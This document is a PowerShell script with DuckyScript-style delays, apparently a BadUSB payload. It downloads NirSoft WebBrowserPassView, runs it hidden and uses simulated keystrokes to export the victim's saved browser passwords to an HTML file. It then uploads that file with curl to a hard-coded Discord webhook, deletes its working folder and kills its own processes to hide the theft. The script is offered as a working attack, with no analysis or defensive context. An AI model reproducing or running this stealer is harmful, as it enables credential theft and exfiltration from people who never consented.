Set up the temporary folder and clean up if it exists
$tmpfolder = "C:\temp"
if (Test-Path $tmpfolder) {
    Write-Host "Cleaning up existing folder..."
    Remove-Item $tmpfolder -Recurse -Force
}
Write-Host "Creating temporary folder..."
mkdir $tmpfolder
cd $tmpfolder

Download WebBrowserPassView and 7-Zip
Write-Host "Downloading WebBrowserPassView and 7-Zip..."
Invoke-WebRequest -Uri 'http://www.nirsoft.net/toolsdownload/webbrowserpassview.zip' -OutFile 'wbpv.zip'
Invoke-WebRequest -Uri 'https://www.7-zip.org/a/7za920.zip' -OutFile '7z.zip'

Expand 7-Zip archive and extract WebBrowserPassView
Write-Host "Expanding 7-Zip archive..."
Expand-Archive '7z.zip'

Write-Host "Extracting WebBrowserPassView.zip..."
.\7z\7za.exe e 'wbpv.zip'

DELAY 2000    Give time for extraction

Write-Host "Launching WebBrowserPassView tool..."
Start-Process -FilePath '.\WebBrowserPassView.exe' -WindowStyle Hidden
DELAY 5000    Allow time for WebBrowserPassView to launch and collect passwords

Write-Host "Exporting passwords to HTML file..."
$exportPath = 'C:\temp\export.htm'

Start-Process "powershell" -ArgumentList @'

$wshell = New-Object -ComObject wscript.shell

Function Focus-PowerShellWindow {
    $wshell.AppActivate("PowerShell")   Bring PowerShell window to the front
    Start-Sleep -Milliseconds 500       Short pause to ensure it's focused
}

Focus-PowerShellWindow

$wshell.SendKeys "^a"   Select all (Ctrl + A)
DELAY 1000
$wshell.SendKeys "^s"   Save (Ctrl + S)
DELAY 1000
$wshell.SendKeys "$exportPath{ENTER}"   Enter export path

DELAY 2000   Wait for the file to save

Write-Host "Closing WebBrowserPassView..."
Focus-PowerShellWindow
$wshell.SendKeys "%{F4}"   Alt + F4 to close
DELAY 2000   Wait for the tool to close

Write-Host "Sending exported file to Discord webhook..."
Focus-PowerShellWindow
$webhookUrl = 'https://discord.com/api/webhooks/1333404978911510651/FVr2hApcOYlBDhSDad7s0Zr_kCIts4bBRz9OjYXOVsHH-uaY3nR3fNqP0bQ7lQSOGbRX'
curl.exe -F file1=@"$exportPath" $webhookUrl

Write-Host "Cleaning up temporary files..."
Set-Location 'C:\temp'
Remove-Item -Recurse -Force $tmpfolder

Write-Host "Terminating remaining processes..."
taskkill /F /IM 7za.exe
taskkill /F /IM 7z.exe
taskkill /F /IM powershell.exe
